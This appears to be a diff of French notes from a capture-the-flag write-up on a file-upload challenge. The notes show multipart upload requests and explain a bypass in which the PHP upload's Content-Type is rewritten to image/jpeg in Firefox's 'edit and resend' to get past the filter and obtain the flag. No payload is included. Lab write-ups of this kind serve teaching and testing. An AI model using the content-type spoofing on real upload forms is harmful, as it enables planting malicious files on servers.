@@ -1,3 +1,33 @@
-accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+sur firefox quand on envoie une image on voit que la requete est la suivante :
 
-accept-encoding: gzip, deflate
+
+-----------------------------324288920742012909393152397305
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+-----------------------------324288920742012909393152397305
+Content-Disposition: form-data; name="uploaded"; filename="icon.jpg"
+Content-Type: image/jpeg
+-----------------------------324288920742012909393152397305
+Content-Disposition: form-data; name="Upload"
+
+Upload
+-----------------------------324288920742012909393152397305--
+
+quand on envoie une page .php on voit que la requete est la suivante
+
+-----------------------------53550916742660093942351225058
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+-----------------------------53550916742660093942351225058
+Content-Disposition: form-data; name="uploaded"; filename="test.xhtml"
+Content-Type: application/xhtml+xml
+
+-----------------------------53550916742660093942351225058
+Content-Disposition: form-data; name="Upload"
+
+Upload
+-----------------------------53550916742660093942351225058--
+
+on envoie donc notre page php, puis on fait edit and resend request, et on modifie le content-type par image/jpeg et on arrive a upload l'image et on recoit le flag dans la reponse
